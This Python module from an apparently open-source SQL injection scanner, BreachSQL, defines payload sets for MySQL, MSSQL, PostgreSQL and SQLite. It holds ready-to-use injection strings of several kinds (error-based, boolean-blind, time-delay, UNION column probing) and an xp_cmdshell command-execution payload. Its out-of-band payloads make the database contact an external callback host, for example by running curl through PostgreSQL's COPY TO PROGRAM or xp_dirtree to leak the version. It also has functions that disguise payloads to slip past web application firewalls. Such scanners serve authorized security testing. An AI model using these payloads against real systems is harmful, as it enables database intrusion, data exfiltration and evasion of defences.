# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
BreachSQL — engine/_scanner/payloads.py
SQL injection payload sets and evasion transforms.

Structure:
  - ERROR_PAYLOADS   : per-DBMS payloads that trigger syntax/type errors
  - BOOLEAN_PAIRS    : (true_payload, false_payload) pairs for boolean-blind
  - TIME_PAYLOADS    : per-DBMS time-delay payloads
  - UNION_PROBES     : ORDER BY / UNION SELECT column-count probes
  - OOB_PAYLOADS     : per-DBMS out-of-band payloads (DNS/HTTP)
  - apply_evasion()  : transform a payload string for a given evasion strategy
"""

from __future__ import annotations

import random
import string
import urllib.parse
from typing import List, Tuple

from breachsql.engine.http.waf_detect import (
    EVASION_NONE,
    EVASION_SQL_COMMENT,
    EVASION_SQL_WHITESPACE,
    EVASION_SQL_CASE,
    EVASION_SQL_ENCODE,
    EVASION_SQL_MULTILINE,
    EVASION_CASE_MIXING,
    EVASION_DOUBLE_ENCODE,
    EVASION_NULL_BYTE,
)

# ---------------------------------------------------------------------------
# Unique marker for confirming reflection (union / error output)
# ---------------------------------------------------------------------------
BREACH_MARKER_PREFIX = "BreachSQL_"


def make_marker() -> str:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{BREACH_MARKER_PREFIX}{suffix}"


# ---------------------------------------------------------------------------
# Error-based payloads
# Keys: "generic", "mysql", "mssql", "postgres", "sqlite"
# ---------------------------------------------------------------------------

ERROR_PAYLOADS: dict[str, List[str]] = {
    "generic": [
        "'",
        '"',
        "';",
        '";',
        "'--",
        '"--',
        "' OR '1'='1",
        "' OR 1=1--",
        "' AND 1=CONVERT(int,'a')--",
        "1'",
        "1\"",
        "1`",
        "\\",
        "' AND EXTRACTVALUE(1,0x0a)--",
    ],
    "mysql": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION())) USING utf8)))--",
        "1 AND EXP(~(SELECT * FROM(SELECT VERSION())a))--",
    ],
    "mssql": [
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; WAITFOR DELAY '0:0:0'--",    # safe probe, delay=0
        "' AND 1=1/0--",
        "' HAVING 1=1--",
        "' GROUP BY columnnames HAVING 1=1--",
        "'; EXEC xp_cmdshell('echo test')--",   # risk>=3 only — filtered in active.py
    ],
    "postgres": [
        "' AND 1=CAST((SELECT version()) AS int)--",
        "' AND 1=(SELECT 1 FROM pg_sleep(0))--",   # safe, delay=0
        "'; SELECT pg_sleep(0)--",
        "' UNION SELECT NULL,NULL,version()--",
        "' AND 1=1::integer--",
    ],
    "sqlite": [
        "' AND 1=CAST(sqlite_version() AS INTEGER)--",
        "' AND typeof(1)='integer'--",
        "' UNION SELECT sqlite_version(),NULL--",
        "' AND randomblob(1)--",
        "1' AND '1'='1",
    ],
}

# DB error signatures — used to detect which DBMS is present and confirm error-based SQLi
DB_ERROR_PATTERNS: dict[str, List[str]] = {
    "mysql": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"supplied argument is not a valid mysql",
        r"unclosed quotation mark",
        r"extractvalue\(",
        r"updatexml\(",
    ],
    "mssql": [
        r"microsoft sql server",
        r"incorrect syntax near",
        r"unclosed quotation mark after the character string",
        r"syntax error converting",
        r"mssql_query\(\)",
        r"odbc sql server driver",
        r"\[microsoft\]\[odbc",
    ],
    "postgres": [
        r"postgresql.*error",
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"psql.*error",
        r"invalid input syntax for",
        r"unterminated quoted string at or near",
        r"syntax error at or near",
        r"division by zero",
    ],
    "sqlite": [
        r"sqlite.*error",
        r"sqlite3\.",
        r"sqlite_step\(\)",
        r"near \".*\": syntax error",
        r"unrecognized token",
    ],
    "generic": [
        r"sql syntax",
        r"sql error",
        r"syntax error",
        r"quoted string not properly terminated",
        r"ora-\d{5}",           # Oracle
        r"microsoft ole db",
        r"error in your sql",
        r"unexpected end of sql command",
    ],
}


# ---------------------------------------------------------------------------
# Boolean-based payload pairs (true_payload, false_payload)
# ---------------------------------------------------------------------------

BOOLEAN_PAIRS: List[Tuple[str, str]] = [
    # Classic AND
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--",  "' AND 1=2--"),
    # Numeric context
    (" AND 1=1",     " AND 1=2"),
    (" AND 1=1--",   " AND 1=2--"),
    # OR variants (risk>=2)
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1--",  "' OR 1=2--"),
    # Comment variants
    ("'/**/AND/**/1=1--", "'/**/AND/**/1=2--"),
    # Subquery
    ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"),
    # String length
    ("' AND LENGTH('a')=1--", "' AND LENGTH('a')=2--"),
]

# Only use OR-based pairs when risk >= 2 (they can modify data if stacked)
BOOLEAN_PAIRS_RISK2: List[Tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("' OR 1=1--",  "' OR 1=2--"),
    ("1 OR 1=1",    "1 OR 1=2"),
]


# ---------------------------------------------------------------------------
# Time-based payloads
# Keys: "auto", "mysql", "mssql", "postgres", "sqlite"
# Placeholders: {delay} is replaced at runtime with opts.time_threshold
# ---------------------------------------------------------------------------

TIME_PAYLOADS: dict[str, List[str]] = {
    "auto": [
        # Try each DBMS in order; first one that works identifies the DB
        "' AND SLEEP({delay})--",
        "' AND pg_sleep({delay})--",
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' AND randomblob(100000000)--",
    ],
    "mysql": [
        "' AND SLEEP({delay})--",
        "' OR SLEEP({delay})--",
        "1' AND SLEEP({delay})--",
        "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
        "' AND BENCHMARK({bench},MD5(1))--",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' AND 1=1; WAITFOR DELAY '0:0:{delay}'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--",
    ],
    "postgres": [
        "' AND pg_sleep({delay})--",
        "'; SELECT pg_sleep({delay})--",
        "' OR pg_sleep({delay})--",
        "' AND 1=1 AND pg_sleep({delay})--",
    ],
    "sqlite": [
        "' AND randomblob({blob_size})--",   # {blob_size} = delay * 10_000_000
    ],
}


# ---------------------------------------------------------------------------
# UNION-based probes
# ---------------------------------------------------------------------------

def order_by_probes(max_cols: int = 20) -> List[str]:
    """Generate ORDER BY N probes to determine column count."""
    return [f"' ORDER BY {n}--" for n in range(1, max_cols + 1)]


def union_null_probes(col_count: int, marker: str) -> List[str]:
    """
    Generate UNION SELECT probes for a known column count.
    Tries placing the marker in each column position.
    """
    payloads = []
    for pos in range(col_count):
        cols = ["NULL"] * col_count
        cols[pos] = f"'{marker}'"
        payload = "' UNION SELECT " + ",".join(cols) + "--"
        payloads.append(payload)
    return payloads


# ---------------------------------------------------------------------------
# OOB payloads (require external callback URL)
# Placeholder: {callback} is the interactsh/burp collaborator domain
# ---------------------------------------------------------------------------

OOB_PAYLOADS: dict[str, List[str]] = {
    "mysql": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
        "' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e,'{callback}',0x5c61)))--",
    ],
    "mssql": [
        "'; EXEC master..xp_dirtree '//{callback}/a'--",
        "'; EXEC master..xp_fileexist '//{callback}/a'--",
        "' UNION SELECT NULL,NULL; EXEC master..xp_dirtree '//{callback}/a'--",
    ],
    "postgres": [
        "'; COPY (SELECT version()) TO PROGRAM 'curl http://{callback}'--",
        "' AND (SELECT dblink_send_query('host={callback}','SELECT 1'))--",
    ],
    "sqlite": [],  # SQLite has no native OOB capability
    "auto": [
        "'; EXEC master..xp_dirtree '//{callback}/a'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.{callback}\\\\a'))--",
        "'; COPY (SELECT version()) TO PROGRAM 'curl http://{callback}'--",
    ],
}


# ---------------------------------------------------------------------------
# Evasion transforms
# ---------------------------------------------------------------------------

def apply_evasion(payload: str, evasion: str) -> str:
    """Apply a WAF evasion transform to a raw SQL payload string."""
    if evasion == EVASION_NONE:
        return payload

    if evasion == EVASION_SQL_COMMENT:
        # Insert /**/ between SQL keywords
        result = payload
        for kw in ("SELECT", "UNION", "WHERE", "AND", "OR", "FROM", "INSERT", "UPDATE"):
            result = result.replace(kw, f"/**/\n{kw}/**/")
        return result

    if evasion == EVASION_SQL_WHITESPACE:
        # Replace spaces with tabs and newlines
        return payload.replace(" ", "\t").replace("\t", "\r\n")

    if evasion == EVASION_SQL_CASE:
        # Randomise case of alpha characters in SQL keywords
        def _rand_case(m):
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in m.group(0)
            )
        import re
        return re.sub(r"[A-Za-z]+", _rand_case, payload)

    if evasion == EVASION_SQL_ENCODE:
        # URL-encode the entire payload
        return urllib.parse.quote(payload, safe="")

    if evasion == EVASION_SQL_MULTILINE:
        # Wrap keywords in multi-line comments
        return payload.replace(" ", "/*\n*/")

    if evasion == EVASION_CASE_MIXING:
        return payload.swapcase()

    if evasion == EVASION_DOUBLE_ENCODE:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    if evasion == EVASION_NULL_BYTE:
        return payload + "%00"

    return payload


def get_error_payloads(dbms: str, risk: int) -> List[str]:
    """Return error-based payloads for *dbms* filtered by *risk* level."""
    generic = ERROR_PAYLOADS["generic"]
    specific = ERROR_PAYLOADS.get(dbms, []) if dbms != "auto" else []
    payloads = generic + specific
    # MSSQL xp_cmdshell only at risk 3
    if risk < 3:
        payloads = [p for p in payloads if "xp_cmdshell" not in p.lower()]
    return payloads


def get_boolean_pairs(risk: int) -> List[Tuple[str, str]]:
    """Return boolean payload pairs for the given risk level."""
    pairs = BOOLEAN_PAIRS.copy()
    if risk >= 2:
        pairs += BOOLEAN_PAIRS_RISK2
    return pairs


def get_time_payloads(dbms: str, delay: int) -> List[str]:
    """Return time-based payloads with {delay} and {bench}/{blob_size} substituted."""
    raw = TIME_PAYLOADS.get(dbms, TIME_PAYLOADS["auto"])
    bench = delay * 5_000_000        # MySQL BENCHMARK iterations
    blob_size = delay * 10_000_000   # SQLite randomblob bytes
    return [
        p.format(delay=delay, bench=bench, blob_size=blob_size)
        for p in raw
    ]


def get_oob_payloads(dbms: str, callback: str) -> List[str]:
    """Return OOB payloads with {callback} substituted."""
    # Extract just the hostname from the callback URL for DNS payloads
    parsed = urllib.parse.urlparse(callback)
    hostname = parsed.netloc or parsed.path or callback
    raw = OOB_PAYLOADS.get(dbms, OOB_PAYLOADS["auto"])
    return [p.format(callback=hostname) for p in raw]
